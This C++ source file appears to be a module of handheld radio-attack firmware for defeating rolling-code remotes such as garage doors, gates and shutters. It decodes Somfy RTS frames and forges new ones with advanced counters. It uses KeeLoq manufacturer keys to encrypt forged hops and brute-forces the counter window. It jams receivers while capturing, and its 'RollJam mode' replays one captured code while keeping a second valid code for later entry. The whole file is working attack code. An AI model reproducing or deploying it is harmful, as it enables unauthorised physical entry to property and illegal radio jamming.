#include "rf_rolling.h"
#include "core/display.h"
#include "core/led_control.h"
#include "core/sd_functions.h"
#include "core/settings.h"
#include "core/type_convertion.h"
#include "protocols/rf_decoder.h"
#include "protocols/rf_encoder.h"
#include "protocols/rf_keeloq.h"
#include "protocols/rf_registry.h"
#include "rf_scan.h"
#include "rf_utils.h"
#include <globals.h>

// Defined in rf_scan.cpp. Repeated here so this unit does not depend on the
// scan module's header layout.
bool rf_try_keeloq(const std::vector<int> &durations, RfCodes &received);
bool rfSaveSignal(float frequency, RfCodes codes, bool raw, char *key, bool autoSave);

// ---------------------------------------------------------------------------
// Somfy Telis / Keytis (RTS)
//   te_short 640 us, te_long 1280 us, delta 250 us, 56-bit frame.
//   Manchester: bit 1 = LOW,HIGH ; bit 0 = HIGH,LOW. Adjacent equal half-slots
//   merge, which push_seg() reproduces.
//   Plaintext after XOR de-obfuscation:
//     key[8] btn[4] crc[4] cnt[16] serial[24]
//   with crc = XOR-fold of all 7 plaintext bytes, low nibble.
// ---------------------------------------------------------------------------
#define SOMFY_TE 640
#define SOMFY_DELTA 250
#define SOMFY_WAKE_H 9415
#define SOMFY_WAKE_L 89565
#define SOMFY_HWSYNC 2560
#define SOMFY_SWSYNC 4550
#define SOMFY_GAP 30415
#define SOMFY_BITS 56

enum RollingProto { RP_KEELOQ = 0, RP_SOMFY, RP_COUNT };
static const char *rolling_proto_name[RP_COUNT] = {"KeeLoq (keystore)", "Somfy Telis/Keytis"};

static float roll_freq = 433.92f;
static int roll_proto = RP_SOMFY;
static int roll_repeat = 1;
static int roll_window = 2048;
static int16_t roll_step = 1;
static bool roll_jam = false;

static void push_seg(std::vector<int> &out, bool high, int dur) {
    int v = high ? dur : -dur;
    if (!out.empty() && ((out.back() > 0) == high)) out.back() += v;
    else out.push_back(v);
}

static uint8_t somfy_crc(uint64_t data) {
    uint8_t crc = 0;
    data &= 0xFFF0FFFFFFFFFFULL;
    for (uint8_t i = 0; i < 56; i += 8)
        crc = crc ^ (uint8_t)(data >> i) ^ (uint8_t)(data >> (i + 4));
    return crc & 0x0F;
}

static uint64_t somfy_build_frame(uint8_t key_byte, uint32_t serial, uint8_t btn, uint16_t cnt) {
    uint8_t f[7];
    f[0] = key_byte;
    f[1] = btn << 4;
    f[2] = cnt >> 8;
    f[3] = cnt & 0xFF;
    f[4] = (serial >> 16) & 0xFF;
    f[5] = (serial >> 8) & 0xFF;
    f[6] = serial & 0xFF;

    uint8_t cks = 0;
    for (int i = 0; i < 7; i++) cks ^= f[i] ^ (f[i] >> 4);
    f[1] |= (cks & 0x0F);
    for (int i = 1; i < 7; i++) f[i] ^= f[i - 1];

    uint64_t data = 0;
    for (int i = 0; i < 7; i++) data = (data << 8) | f[i];
    return data;
}

// Wake-up, hardware sync, software sync, 56 Manchester bits, inter-frame gap.
// `extra` retransmissions use the 7-pair hardware sync form.
static void somfy_encode(uint64_t data, int extra, std::vector<int> &out) {
    out.clear();
    push_seg(out, true, SOMFY_WAKE_H);
    push_seg(out, false, SOMFY_WAKE_L);

    for (int f = 0; f <= extra; f++) {
        int pairs = (f == 0) ? 2 : 7;
        for (int i = 0; i < pairs; i++) {
            push_seg(out, true, SOMFY_HWSYNC);
            push_seg(out, false, SOMFY_HWSYNC);
        }
        push_seg(out, true, SOMFY_SWSYNC);
        push_seg(out, false, SOMFY_TE);
        for (int i = SOMFY_BITS - 1; i >= 0; i--) {
            if ((data >> i) & 1) {
                push_seg(out, false, SOMFY_TE);
                push_seg(out, true, SOMFY_TE);
            } else {
                push_seg(out, true, SOMFY_TE);
                push_seg(out, false, SOMFY_TE);
            }
        }
        push_seg(out, false, SOMFY_GAP);
    }
}

static inline bool near(int dur, int ref, int tol) { return abs(dur - ref) <= tol; }

static bool somfy_decode(
    const std::vector<int> &d, uint32_t &serial, uint8_t &btn, uint16_t &cnt, uint8_t &key_byte
) {
    for (size_t i = 0; i + 3 < d.size(); i++) {
        if (!(d[i] > 2100 && d[i] < 3100 && -d[i + 1] > 2100 && -d[i + 1] < 3100)) continue;

        size_t j = i;
        int pairs = 0;
        while (j + 1 < d.size() && d[j] > 2100 && d[j] < 3100 && -d[j + 1] > 2100 && -d[j + 1] < 3100) {
            pairs++;
            j += 2;
        }
        if (pairs < 2 || j + 1 >= d.size()) continue;
        if (!near(d[j], SOMFY_SWSYNC, 700)) continue;

        std::vector<uint8_t> half;
        for (size_t k = j + 1; k < d.size() && half.size() < 2 * SOMFY_BITS; k++) {
            int dur = d[k] < 0 ? -d[k] : d[k];
            if (dur > 2000) break;
            int n = dur > 960 ? 2 : 1;
            for (int t = 0; t < n; t++) half.push_back(d[k] > 0 ? 1 : 0);
        }
        if (half.size() < 2 * SOMFY_BITS) return false;

        uint64_t raw = 0;
        for (int b = 0; b < 2 * SOMFY_BITS; b += 2) {
            uint8_t a1 = half[b], a2 = half[b + 1];
            if (a1 == 0 && a2 == 1) raw = (raw << 1) | 1;
            else if (a1 == 1 && a2 == 0) raw = (raw << 1) | 0;
            else return false;
        }

        uint64_t data = raw ^ (raw >> 8);
        if (((data >> 40) & 0xF) != somfy_crc(data)) return false;

        key_byte = (data >> 48) & 0xFF;
        btn = (data >> 44) & 0x0F;
        cnt = (data >> 24) & 0xFFFF;
        serial = data & 0xFFFFFF;
        return true;
    }
    return false;
}

static inline uint64_t reverse64_shift(uint32_t enc, uint64_t fix_rev) {
    return (uint64_t)reverse_bits(enc, 32) << 32 | fix_rev;
}

// ---------------------------------------------------------------------------
// Menus
// ---------------------------------------------------------------------------

static void rolling_frequency_menu() {
    options = {};
    int ind = 0;
    int n = sizeof(subghz_frequency_list) / sizeof(subghz_frequency_list[0]);
    for (int i = 0; i < n; i++) {
        String tmp = String(subghz_frequency_list[i], 2) + "MHz";
        options.push_back({tmp.c_str(), [=]() { roll_freq = subghz_frequency_list[i]; }});
        if (int(roll_freq * 100) == int(subghz_frequency_list[i] * 100)) ind = i;
    }
    loopOptions(options, ind);
    options.clear();
}

static void rolling_window_menu() {
    options = {
        {"256",   [=]() { roll_window = 256; }   },
        {"1024",  [=]() { roll_window = 1024; }  },
        {"2048",  [=]() { roll_window = 2048; }  },
        {"8192",  [=]() { roll_window = 8192; }  },
        {"65536", [=]() { roll_window = 65536; } },
        {"Back",  [=]() {}                       },
    };
    loopOptions(options);
    options.clear();
}

static void rolling_step_menu() {
    options = {
        {"1",    [=]() { roll_step = 1; }},
        {"2",    [=]() { roll_step = 2; }},
        {"4",    [=]() { roll_step = 4; }},
        {"Back", [=]() {}                },
    };
    loopOptions(options);
    options.clear();
}

static void rolling_repeat_menu() {
    options = {};
    for (int i = 1; i <= 5; i++) options.push_back({String(i).c_str(), [=]() { roll_repeat = i; }});
    loopOptions(options, roll_repeat - 1);
    options.clear();
}

// ---------------------------------------------------------------------------
// Capture
// ---------------------------------------------------------------------------

// Capture one RAW burst. With `jam` the auxiliary rfTx module is held high for
// the whole listen window so the receiver never sees the press.
static bool capture_burst(std::vector<int> &durs, int timeout_ms, bool jam) {
    durs.clear();
    if (!initRfModule("rx", roll_freq)) return false;
    setMHZ(roll_freq);

    if (jam) {
        pinMode(bruceConfigPins.rfTx, OUTPUT);
        digitalWrite(bruceConfigPins.rfTx, HIGH);
    }

    RfRxSession rx;
    bool ok = false;
    if (rx.begin()) {
        uint32_t start = millis();
        while (millis() - start < (uint32_t)timeout_ms) {
            if (rx.poll(durs) && durs.size() > 40) {
                ok = true;
                break;
            }
            if (check(EscPress)) break;
            vTaskDelay(1 / portTICK_PERIOD_MS);
        }
        rx.end();
    }

    if (jam) digitalWrite(bruceConfigPins.rfTx, LOW);
    deinitRfModule();
    return ok;
}

static void print_progress(const String &title, uint32_t done, uint32_t total, uint32_t started) {
    uint32_t elapsed = (millis() - started) / 1000;
    uint32_t eta = done ? (uint32_t)((uint64_t)elapsed * (total - done) / done) : 0;
    char line[64];
    snprintf(
        line,
        sizeof(line),
        "%lu/%lu  %lus left",
        (unsigned long)done,
        (unsigned long)total,
        (unsigned long)eta
    );
    drawMainBorderWithTitle(title);
    padprintln(line);
    padprintln("");
    padprintln("SEL = it opened");
    padprintln("ESC = stop");
}

static void save_hit(RfCodes code, const char *proto, bool raw) {
    if (code.preset == "") code.preset = "Ook650Async";
    code.protocol = proto;
    char hex[32] = {0};
    decimalToHexString(code.key, hex);
    displayTextLine("Saving..", false);
    rfSaveSignal(roll_freq, code, raw, hex, false);
}

static void hit_banner(const String &msg) {
    displayRedStripe(msg, getComplementaryColor2(bruceConfig.priColor), bruceConfig.priColor);
    delay(1500);
}

// ---------------------------------------------------------------------------
// KeeLoq
// ---------------------------------------------------------------------------

static void run_keeloq() {
    RfCodes code;
    std::vector<int> durs;

    drawMainBorderWithTitle("KeeLoq capture");
    padprintln("Press the remote");
    padprintln("near the device.");
    padprintln("");
    padprintln("ESC = back");

    if (!capture_burst(durs, 20000, roll_jam)) return;
    if (!rf_try_keeloq(durs, code)) {
        displayError("Not a KeeLoq frame", true);
        return;
    }
    if (code.mf_name == "Unknown") {
        displayError("Manufacturer key unknown", true);
        return;
    }

    // Resolve the manufacturer key once; keeloq_step() would re-read the
    // keystore for every single frame otherwise.
    KeeloqKeystore keystore{keeloq_mfcodes_fs()};
    uint64_t man_key = 0;
    uint32_t man_type = 0;
    for (const auto &k : keystore.get_keys()) {
        if (k.mf_name == code.mf_name) {
            man_key = k.key;
            man_type = k.type;
        }
    }
    if (!man_key) {
        displayError("No key for " + code.mf_name, true);
        return;
    }

    uint32_t seed_eff = code.seed ? code.seed : (code.fix & 0x0FFFFFFF);
    uint64_t man = keeloq_derive_man(man_type, code.fix, seed_eff, man_key);

    uint16_t start = code.cnt + roll_step;
    uint32_t total = (uint32_t)roll_window;
    uint64_t fix_rev = reverse_bits(code.fix, 32);

    if (!initRfModule("tx", roll_freq)) return;
    setMHZ(roll_freq);

    uint32_t started = millis();
    bool hit = false;
    uint16_t hit_cnt = 0;

    for (uint32_t i = 0; i < total; i++) {
        uint16_t cnt = start + (uint16_t)(i * roll_step);
        uint32_t hop = keeloq_build_hop(code.mf_name, code.btn, code.serial, cnt);
        uint32_t enc = keeloq_encrypt(hop, man);
        rf_tx_keeloq(reverse64_shift(enc, fix_rev), roll_repeat);

        if ((i & 15) == 0) {
            print_progress("KeeLoq brute", i, total, started);
            if (check(EscPress)) break;
            if (check(SelPress)) {
                hit = true;
                hit_cnt = cnt;
                break;
            }
        }
    }

    digitalWrite(bruceConfigPins.CC1101_bus.io0, LOW);
    deinitRfModule();

    if (hit) {
        code.cnt = hit_cnt;
        code.keeloq_step(0);
        save_hit(code, "KeeLoq", false);
        hit_banner("Counter " + String(hit_cnt));
    }
}

// ---------------------------------------------------------------------------
// Somfy
// ---------------------------------------------------------------------------

static void run_somfy() {
    std::vector<int> durs;
    uint32_t serial = 0;
    uint8_t btn = 0, key_byte = 0;
    uint16_t cnt = 0;

    drawMainBorderWithTitle("Somfy capture");
    padprintln("Press the remote");
    padprintln("near the device.");
    padprintln("");
    padprintln("ESC = back");

    if (!capture_burst(durs, 20000, roll_jam)) return;
    if (!somfy_decode(durs, serial, btn, cnt, key_byte)) {
        displayError("Not a Somfy frame", true);
        return;
    }

    uint32_t total = (uint32_t)roll_window;
    uint32_t started = millis();
    bool hit = false;
    uint16_t hit_cnt = 0;

    if (!initRfModule("tx", roll_freq)) return;
    setMHZ(roll_freq);

    for (uint32_t i = 0; i < total; i++) {
        uint16_t cur = cnt + (uint16_t)(i * roll_step);
        uint64_t frame = somfy_build_frame(key_byte, serial, btn, cur);
        somfy_encode(frame, roll_repeat - 1, durs);
        rf_tx_durations(durs);

        if ((i & 7) == 0) {
            print_progress("Somfy brute", i, total, started);
            if (check(EscPress)) break;
            if (check(SelPress)) {
                hit = true;
                hit_cnt = cur;
                break;
            }
        }
    }

    digitalWrite(bruceConfigPins.CC1101_bus.io0, LOW);
    deinitRfModule();

    if (hit) {
        RfCodes code;
        uint64_t frame = somfy_build_frame(key_byte, serial, btn, hit_cnt);
        somfy_encode(frame, roll_repeat - 1, durs);

        String out;
        for (size_t i = 0; i < durs.size(); i++) out += String(durs[i]) + " ";

        code.frequency = (uint32_t)(roll_freq * 1000000);
        code.te = SOMFY_TE;
        code.key = frame;
        code.serial = serial;
        code.btn = btn;
        code.cnt = hit_cnt;
        code.data = out;
        save_hit(code, "RAW", true);
        hit_banner("Somfy counter " + String(hit_cnt));
    }
}

// ---------------------------------------------------------------------------
// Jam & harvest (works on any protocol)
// ---------------------------------------------------------------------------

static void run_rolljam() {
    std::vector<int> a, b;
    RfCodes cb;

    drawMainBorderWithTitle("Jam & harvest");
    padprintln("Jammer on rfTx pin.");
    padprintln("");
    padprintln("Press once, then ESC.");
    padprintln("(receiver is blinded)");

    if (!capture_burst(a, 25000, true)) {
        displayError("Nothing captured", true);
        return;
    }

    drawMainBorderWithTitle("Code A held");
    padprintln("Press AGAIN on the");
    padprintln("same remote.");

    if (!capture_burst(b, 25000, true)) {
        displayError("Nothing captured", true);
        return;
    }

    // Keep B on the card: it stays valid for the next entry.
    String db;
    for (int v : b) db += String(v) + " ";
    cb.frequency = (uint32_t)(roll_freq * 1000000);
    cb.preset = "Ook650Async";
    cb.protocol = "RAW";
    cb.te = 400;
    cb.data = db;
    save_hit(cb, "RAW", true);

    if (!initRfModule("tx", roll_freq)) return;
    setMHZ(roll_freq);
    drawMainBorderWithTitle("Replaying A");
    rf_tx_durations(a);
    digitalWrite(bruceConfigPins.CC1101_bus.io0, LOW);
    deinitRfModule();

    hit_banner("B saved for next entry");
}

// ---------------------------------------------------------------------------
// Entry
// ---------------------------------------------------------------------------

void rf_rolling() {
    if (bruceConfigPins.rfModule != CC1101_SPI_MODULE) {
        displayError("CC1101 required", true);
        return;
    }

    returnToMenu = false;

    while (true) {
        options = {
            {"Start",
             [&]() {
                 if (roll_proto == RP_KEELOQ) run_keeloq();
                 else run_somfy();
             }                                                    },
            {"Protocol: " + String(rolling_proto_name[roll_proto]),
             [&]() { roll_proto = (roll_proto + 1) % RP_COUNT; }   },
            {"Frequency: " + String(roll_freq, 2), [&]() { rolling_frequency_menu(); }},
            {"Window: " + String(roll_window),     [&]() { rolling_window_menu(); }   },
            {"Step: " + String(roll_step),         [&]() { rolling_step_menu(); }     },
            {"Repeat: " + String(roll_repeat),     [&]() { rolling_repeat_menu(); }   },
            {"Jam on capture: " + String(roll_jam ? "ON" : "OFF"), [&]() { roll_jam = !roll_jam; }},
            {"RollJam mode",                       [&]() { run_rolljam(); }           },
            {"Main Menu",                          [&]() { returnToMenu = true; }     },
        };
        loopOptions(options);
        if (returnToMenu) return;
    }
}